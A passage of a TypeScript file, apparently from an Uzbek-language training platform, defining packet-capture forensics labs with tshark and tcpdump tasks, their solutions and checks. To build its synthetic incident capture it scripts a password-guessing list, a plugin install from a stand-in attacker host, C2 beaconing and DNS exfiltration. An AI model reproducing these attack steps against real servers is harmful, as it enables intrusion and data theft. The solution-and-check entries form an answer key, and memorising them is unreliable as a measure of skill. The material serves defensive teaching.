      solution: ["tshark -r eski.pcap -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.extensions_server_name"],
      check: ({ output }) => output.trim() === 'github.com',
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa: tarmoqda ochiq ketgan uchta sirni `~/topilmalar.txt` ga yozing — FTP paroli, printerning login:paroli va xatdagi VPN paroli satri.",
      hint: "Uchta buyruq: birinchisi `>` bilan, keyingilari `>>` bilan. Xat satrini oqimdan `grep` bilan ajrating.",
      solution: [
        "tshark -r eski.pcap -Y 'ftp.request.command == \"PASS\"' -T fields -e ftp.request.arg > ~/topilmalar.txt",
        `echo ${PRINTER_BASIC} | base64 -d >> ~/topilmalar.txt`,
        `tshark -r eski.pcap -q -z follow,tcp,ascii,${SMTP_STREAM} | grep VPN >> ~/topilmalar.txt`,
      ],
      check: ({ state }) => {
        const t = fileAt(state, `${HOME}/topilmalar.txt`) ?? '';
        return t.includes('Zaxira2024!') && t.includes('admin:printer123') && t.includes('Qish2027');
      },
    },
  ],
};

/* ── 3. Incident: scan, password guessing, beaconing and DNS exfiltration ── */

export const SCANNER = '203.0.113.66';
export const C2 = '198.51.100.77';
const WEB = '10.10.20.22';
const SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443];
const OPEN_PORTS = [22, 80, 443];
const GUESSES = ['admin', '123456', 'password', 'qwerty', 'admin123', 'letmein', 'welcome', 'P@ssw0rd', 'changeme', 'root', 'qaydnoma', 'admin2025', 'Qaydnoma1', 'iloveyou'];
const WINNER = 'admin2026';
const EXFIL_TEXT = 'MAXFIY: mijozlar.csv 1532 qator yuborildi';
const EXFIL_HEX = [...new TextEncoder().encode(EXFIL_TEXT)].map((b) => b.toString(16).padStart(2, '0')).join('');
const EXFIL_CHUNKS = EXFIL_HEX.match(/.{1,30}/g)!;
const BEACON_JITTER = [0.0, 0.42, 0.18, 0.77, 0.25, 0.61, 0.09, 0.53];

function attackCapture(): { content: string; successStream: number } {
  const c = new Capture();
  const ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0';
  // Background: staff using the application over HTTPS, the server updating packages.
  c.tls(at(2, 58, 10), PC, 54001, WEB, 'qaydnoma.lab', [920, 6400]);
  c.dns(at(2, 59, 0), WEB, GW, 'deb.debian.org', ['151.101.130.132']);
  // 03:00 — SYN scan.
  SCAN_PORTS.forEach((port, i) => c.probe(at(3, 0, 1 + i * 0.07), SCANNER, 61234, WEB, port, OPEN_PORTS.includes(port)));
  // 03:02 — the web application: a look around, then password guessing on /login.
  let t = c.tcp(at(3, 2, 0), SCANNER, 61300, WEB, 80, [{ c: httpGet('10.10.20.22', '/', ua), s: httpResponse(200, 'OK', '<html><h1>Qaydnoma</h1><a href="/login">Kirish</a></html>') }]);
  t = c.tcp(t + 1.1, SCANNER, 61301, WEB, 80, [{ c: httpGet('10.10.20.22', '/admin', ua), s: httpResponse(401, 'Unauthorized', '{"error":"login required"}', 'application/json') }]);
  const pyUa = 'python-requests/2.31.0';
  GUESSES.forEach((pw, i) => {
    t = c.tcp(t + 1.6, SCANNER, 61310 + i, WEB, 80, [{ c: httpPost('10.10.20.22', '/login', `username=admin&password=${encodeURIComponent(pw)}`, pyUa), s: httpResponse(401, 'Unauthorized', '{"error":"invalid credentials"}', 'application/json') }]);
  });
  t = c.tcp(t + 1.6, SCANNER, 61330, WEB, 80, [
    { c: httpPost('10.10.20.22', '/login', `username=admin&password=${WINNER}`, pyUa), s: httpResponse(302, 'Found', '', 'text/html', ['Location: /admin', 'Set-Cookie: session=c0ffee42b7; HttpOnly']) },
  ]);
  c.tcp(t + 4, SCANNER, 61331, WEB, 80, [
    { c: httpGet('10.10.20.22', '/admin', ua, ['Cookie: session=c0ffee42b7']), s: httpResponse(200, 'OK', '<html><h1>Admin</h1></html>') },
    { c: httpPost('10.10.20.22', '/admin/plugins/install', 'name=backup-helper&source=http%3A%2F%2F198.51.100.77%2Fp.zip', ua, 'application/x-www-form-urlencoded', ['Cookie: session=c0ffee42b7']), s: httpResponse(200, 'OK', '{"installed":"backup-helper"}', 'application/json'), dt: 3 },
  ]);
  // 03:10 — the server calls home every minute.
  const beaconUa = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)';
  BEACON_JITTER.forEach((j, i) => {
    const last = i === BEACON_JITTER.length - 1;
    c.tcp(at(3, 10 + i, j), WEB, 40100 + i, C2, 80, [{ c: httpGet('198.51.100.77', '/api/v2/check?id=srv22', beaconUa), s: httpResponse(200, 'OK', last ? '{"cmd":"upload"}' : '{"cmd":"sleep"}', 'application/json') }]);
  });
  // 03:17:30 — data out through DNS, hex in the first label.
  EXFIL_CHUNKS.forEach((chunk, i) => c.dns(at(3, 17, 30 + i * 0.8), WEB, GW, `${chunk}.${i}.t.exfil-cdn.example`, 'NXDOMAIN', 'TXT'));
  // 03:18 — and a large upload over HTTP.
  c.tcp(at(3, 18, 5), WEB, 40200, C2, 80, [{ c: httpPost('198.51.100.77', '/upload', 'PK' + 'x'.repeat(23998), beaconUa, 'application/octet-stream'), s: httpResponse(200, 'OK', '{"ok":true}', 'application/json') }]);
  const content = c.build();
  const fs = frames(content);
  const successStream = fs.find((f) => field(f, 'http.response.code')[0] === 302)!.stream!;
  return { content, successStream };
}

const ATTACK = attackCapture();
const ATTACK_FRAMES = frames(ATTACK.content);
const SYN_FROM_SCANNER = ATTACK_FRAMES.filter((f) => f.p.src === SCANNER && f.p.fl === 'S').length;
const RST_FROM_WEB = ATTACK_FRAMES.filter((f) => f.p.src === WEB && (f.p.fl ?? '').includes('R')).length;
const COUNT_401 = ATTACK_FRAMES.filter((f) => field(f, 'http.response.code')[0] === 401).length;

export const trafficIncident: Lab = {
  id: 'trafik-insident',
  title: "Insident trafigi: skanerdan ma'lumot chiqarishgacha",
  summary: "Hujum yozuvini bosqichma-bosqich tahlil qilish: port skanerlash, ochiq portlar, parol tanlash va muvaffaqiyatli kirish, C2 beacon va uning davri, DNS orqali ma'lumot chiqarish, katta yuklash, dalil va indikatorlar.",
  minutes: 65,
  level: 3,
  intro:
    "`SRV-WEB-01` (`10.10.20.22`) veb-serveri tunda g'alati ishladi. Tarmoq jamoasi switch'dagi nusxa portidan (SPAN) 02:58 dan 03:19 gacha trafikni yozib olgan: `hujum.pcap`.\n\n" +
    "Hujum zanjirini trafikdan tiklang: **razvedka** (skanerlash) → **kirish** (parol tanlash) → **boshqaruv** (C2 bilan aloqa) → **chiqarish** (ma'lumotni olib ketish). Har bosqichdan indikator (IOC) yig'ing — manzil, domen, User-Agent.\n\n" +
    "Bu labda tcpdump BPF filtrlari va tshark display filtrlari birga ishlatiladi; `sort | uniq -c | sort -rn` — eng kuchli yordamchingiz.",
  shell: () => ({ fs: { home: { talaba: { 'hujum.pcap': ATTACK.content } }, tmp: {} } }),
  tasks: [
    {
      id: 'capinfos',
      text: 'Yozuv qaysi vaqtni qamraydi va nechta paket?',
      hint: '`capinfos hujum.pcap`',
      solution: ['capinfos hujum.pcap'],
      check: ({ output }) => output.includes(`Number of packets:   ${ATTACK_FRAMES.length}`) && output.includes('02:58:10'),
    },
    {
      id: 'endpoints',
      text: "Qaysi manzillar ishtirok etgan va kim qancha bayt yuborgan?",
      hint: '`tshark -r hujum.pcap -q -z endpoints,ip` — ichki tarmoqdan (10.x) tashqaridagi ikkita manzilga e\'tibor bering.',
      solution: ['tshark -r hujum.pcap -q -z endpoints,ip'],
      check: ({ output }) => output.includes(SCANNER) && output.includes(C2),
    },
    {
      id: 'syn-sources',
      teach: ['tshark tcp.flags.syn == 1'],
      text: "Ulanish boshlovchi paketlar (SYN bor, ACK yo'q) kimdan ko'p keldi? Manbalar bo'yicha sanang.",
      hint: "`tshark -r hujum.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e ip.src | sort | uniq -c | sort -rn`",
      solution: ["tshark -r hujum.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e ip.src | sort | uniq -c | sort -rn"],
      check: ({ output }) => (output.split('\n')[0] ?? '').trim() === `${SYN_FROM_SCANNER} ${SCANNER}`,
    },
    {
      id: 'scan-bpf',
      teach: ['tcpdump tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn', 'tcpdump src host / dst host'],
      text: "Skanerlashni tcpdump bilan ham ko'ring: faqat shu manbadan kelgan, faqat SYN bayroqli paketlar.",
      hint: "`tcpdump -nn -r hujum.pcap 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn and src host 203.0.113.66'` — sekundning bir necha o'ndan bir qismida o'nlab portlar: skaner.",
      solution: [`tcpdump -nn -r hujum.pcap 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn and src host ${SCANNER}'`],
      check: ({ output }) => output.split('\n').filter((l) => l.includes('Flags [S]')).length === SYN_FROM_SCANNER && !output.includes('Flags [S.]'),
    },
    {
      id: 'ports-probed',
      text: 'Skaner nechta turli portni tekshirgan?',
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${SCANNER} && tcp.flags.syn == 1' -T fields -e tcp.dstport | sort -u | wc -l\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${SCANNER} && tcp.flags.syn == 1' -T fields -e tcp.dstport | sort -u | wc -l`],
      check: ({ output }) => output.trim() === String(SCAN_PORTS.length),
    },
    {
      id: 'open',
      text: "Skaner qaysi portlarni ochiq deb topdi? Server SYN-ACK bilan javob bergan portlar.",
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && ip.dst == ${SCANNER} && tcp.flags.syn == 1 && tcp.flags.ack == 1' -T fields -e tcp.srcport | sort -n -u\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && ip.dst == ${SCANNER} && tcp.flags.syn == 1 && tcp.flags.ack == 1' -T fields -e tcp.srcport | sort -n -u`],
      check: ({ output }) => output.trim() === OPEN_PORTS.join('\n'),
    },
    {
      id: 'closed',
      text: 'Yopiq portlar RST bilan javob beradi. Server nechta RST yuborgan?',
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && tcp.flags.reset == 1' | wc -l\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && tcp.flags.reset == 1' | wc -l`],
      check: ({ output }) => output.trim() === String(RST_FROM_WEB),
    },
    {
      id: 'http-scanner',
      text: "Skanerdan keyin xuddi shu manzil veb-saytga nima so'radi? Vaqt, metod va yo'l bilan.",
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${SCANNER} && http.request' -T fields -e frame.time -e http.request.method -e http.request.uri\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${SCANNER} && http.request' -T fields -e frame.time -e http.request.method -e http.request.uri`],
      check: ({ output }) => output.includes('POST\t/login') && output.includes('GET\t/admin'),
    },
    {
      id: '401',
      text: "Nechta so'rov \"ruxsat yo'q\" (401) javobini oldi?",
      hint: "`tshark -r hujum.pcap -Y 'http.response.code == 401' | wc -l` — bir daqiqa ichida o'nlab urinish: parol tanlash.",
      solution: ["tshark -r hujum.pcap -Y 'http.response.code == 401' | wc -l"],
      check: ({ output }) => output.trim() === String(COUNT_401),
    },
    {
      id: 'guesses',
      text: "Qaysi parollar sinab ko'rilgan? Login so'rovlarining mazmunini chiqaring.",
      hint: "`tshark -r hujum.pcap -Y 'http.request.uri == \"/login\"' -T fields -e http.file_data`",
      solution: ["tshark -r hujum.pcap -Y 'http.request.uri == \"/login\"' -T fields -e http.file_data"],
      check: ({ output }) => output.includes('password=123456') && output.includes(`password=${WINNER}`),
    },
    {
      id: 'success',
      text: 'Qaysi urinish muvaffaqiyatli bo\'ldi? 302 javobi qaysi TCP oqimida va qachon?',
      hint: "`tshark -r hujum.pcap -Y 'http.response.code == 302' -T fields -e frame.time -e tcp.stream -e http.set_cookie`",
      solution: ["tshark -r hujum.pcap -Y 'http.response.code == 302' -T fields -e frame.time -e tcp.stream -e http.set_cookie"],
      check: ({ output }) => output.includes(`\t${ATTACK.successStream}\t`) && output.includes('session=c0ffee42b7'),
    },
    {
      id: 'winner',
      text: 'Shu oqimda qaysi parol yuborilgan?',
      hint: `\`tshark -r hujum.pcap -Y 'tcp.stream == ${ATTACK.successStream} && http.request' -T fields -e http.file_data\` — oddiy, taxmin qilsa bo'ladigan parol.`,
      solution: [`tshark -r hujum.pcap -Y 'tcp.stream == ${ATTACK.successStream} && http.request' -T fields -e http.file_data`],
      check: ({ output }) => output.trim() === `username=admin&password=${WINNER}`,
    },
    {
      id: 'after-login',
      text: "Kirgandan keyin hujumchi nima qildi? Sessiya cookie'si bilan yuborilgan so'rovlarni toping.",
      hint: "`tshark -r hujum.pcap -Y 'http.cookie' -T fields -e http.request.method -e http.request.uri -e http.file_data` — plagin tashqi manzildan o'rnatilgan.",
      solution: ["tshark -r hujum.pcap -Y 'http.cookie' -T fields -e http.request.method -e http.request.uri -e http.file_data"],
      check: ({ output }) => output.includes('/admin/plugins/install') && output.includes('198.51.100.77'),
    },
    {
      id: 'outbound',
      text: "Endi serverning o'zi qayerga murojaat qilmoqda? Server boshlagan HTTP so'rovlarni manzil va yo'l bo'yicha sanang.",
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && http.request' -T fields -e ip.dst -e http.request.uri | sort | uniq -c\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${WEB} && http.request' -T fields -e ip.dst -e http.request.uri | sort | uniq -c`],
      check: ({ output }) => output.includes(`${BEACON_JITTER.length} ${C2}\t/api/v2/check?id=srv22`),
    },
    {
      id: 'beacon-ua',
      text: "Bu so'rovlar qaysi User-Agent bilan yuborilgan? Linux serverga mos keladimi?",
      hint: `\`tshark -r hujum.pcap -Y 'ip.dst == ${C2} && http.request' -T fields -e http.user_agent | sort -u\` — Windows XP'dagi Internet Explorer 6: soxta, zararli dastur belgisi.`,
      solution: [`tshark -r hujum.pcap -Y 'ip.dst == ${C2} && http.request' -T fields -e http.user_agent | sort -u`],
      check: ({ output }) => output.trim() === 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    },
    {
      id: 'interval',
      teach: ['tshark frame.time_delta_displayed'],
      text: "So'rovlar orasida qancha vaqt o'tadi? Har birining oldingisidan keyingi soniyalarini chiqaring.",
      hint: `\`tshark -r hujum.pcap -Y 'ip.dst == ${C2} && http.request.uri contains "check"' -T fields -e frame.time_delta_displayed\` — ~60 soniya: muntazam "beacon".`,
      solution: [`tshark -r hujum.pcap -Y 'ip.dst == ${C2} && http.request.uri contains "check"' -T fields -e frame.time_delta_displayed`],
      check: ({ output }) => {
        const d = output.trim().split('\n').slice(1).map(Number);
        return d.length === BEACON_JITTER.length - 1 && d.every((x) => x > 59 && x < 61);
      },
    },
    {
      id: 'io',
      text: "Xuddi shu davriylikni statistika bilan ko'ring: C2 manzili bilan har 60 soniyada nechta paket.",
      hint: `\`tshark -r hujum.pcap -Y 'ip.addr == ${C2}' -q -z io,stat,60\``,
      solution: [`tshark -r hujum.pcap -Y 'ip.addr == ${C2}' -q -z io,stat,60`],
      check: ({ output }) => output.includes('IO Statistics') && output.includes('Interval: 60 secs'),
    },
    {
      id: 'commands',
      text: 'C2 server javobda qanday buyruqlar berdi?',
      hint: `\`tshark -r hujum.pcap -Y 'ip.src == ${C2} && http.response' -T fields -e http.file_data | sort | uniq -c\` — oxirgisi "upload".`,
      solution: [`tshark -r hujum.pcap -Y 'ip.src == ${C2} && http.response' -T fields -e http.file_data | sort | uniq -c`],
      check: ({ output }) => output.includes('{"cmd":"upload"}') && output.includes(`${BEACON_JITTER.length - 1} {"cmd":"sleep"}`),
    },
    {
      id: 'dns-odd',
      text: "Shundan keyin serverning DNS so'rovlariga qarang. Nimasi g'alati?",
      hint: "`tshark -r hujum.pcap -Y 'dns.flags.response == 0' -T fields -e frame.time -e dns.qry.name` — uzun, o'n oltilik belgilardan iborat subdomenlar: DNS orqali ma'lumot chiqarish (tunnel).",
      solution: ["tshark -r hujum.pcap -Y 'dns.flags.response == 0' -T fields -e frame.time -e dns.qry.name"],
      check: ({ output }) => output.includes('.t.exfil-cdn.example') && output.includes('deb.debian.org'),
    },
    {
      id: 'decode',
      text: "Birinchi bo'laklarni ketma-ket birlashtirib, hex'dan matnga aylantiring: nima chiqarib yuborilgan?",
      hint: "`tshark -r hujum.pcap -Y 'dns.qry.name contains \"exfil-cdn\" && dns.flags.response == 0' -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\\n' | xxd -r -p`",
      solution: ["tshark -r hujum.pcap -Y 'dns.qry.name contains \"exfil-cdn\" && dns.flags.response == 0' -T fields -e dns.qry.name | cut -d. -f1 | tr -d '\\n' | xxd -r -p"],
      check: ({ output }) => output.trim() === EXFIL_TEXT,
    },
    {
      id: 'upload',
      text: "Oxirida C2 ga katta POST yuborilgan. Qaysi yo'lga va necha bayt?",
      hint: `\`tshark -r hujum.pcap -Y 'http.request.method == "POST" && ip.dst == ${C2}' -T fields -e http.request.uri -e http.content_type -e http.content_length\``,
      solution: [`tshark -r hujum.pcap -Y 'http.request.method == "POST" && ip.dst == ${C2}' -T fields -e http.request.uri -e http.content_type -e http.content_length`],
      check: ({ output }) => output.trim() === '/upload\tapplication/octet-stream\t24000',
    },
    {
      id: 'evidence',
      text: "C2 bilan bog'liq barcha paketlarni dalil sifatida `~/c2.pcap` ga ajratib saqlang.",
      hint: `\`tcpdump -r hujum.pcap -w ~/c2.pcap host ${C2}\`, tekshirish: \`capinfos ~/c2.pcap\``,
      solution: [`tcpdump -r hujum.pcap -w ~/c2.pcap host ${C2}`],
      check: ({ state }) => {
        const content = fileAt(state, `${HOME}/c2.pcap`);
        const packets = content ? decodeCapture(content) : null;
        return !!packets && packets.length > 0 && packets.every((p) => p.src === C2 || p.dst === C2) && packets.length === ATTACK_FRAMES.filter((f) => f.p.src === C2 || f.p.dst === C2).length;
      },
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa: `~/ioc.txt` ga indikatorlarni yozing — har qatorda bittadan: skaner IP, C2 IP, ma'lumot chiqarilgan asosiy domen (`exfil-cdn.example`) va beacon User-Agent'i. Iloji boricha tshark natijasidan oling.",
      hint: "IP'larni yozish uchun `echo ... >>` yetadi; User-Agent'ni oldingi topshiriqdagi buyruq bilan `>>` qilib qo'shing.",
      solution: [
        `echo ${SCANNER} > ~/ioc.txt`,
        `echo ${C2} >> ~/ioc.txt`,
        'echo exfil-cdn.example >> ~/ioc.txt',
        `tshark -r hujum.pcap -Y 'ip.dst == ${C2} && http.request' -T fields -e http.user_agent | sort -u >> ~/ioc.txt`,
      ],
      check: ({ state }) => {
        const lines = (fileAt(state, `${HOME}/ioc.txt`) ?? '').split('\n').map((l) => l.trim());
        return [SCANNER, C2, 'exfil-cdn.example', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'].every((x) => lines.includes(x));
      },
    },
  ],
};
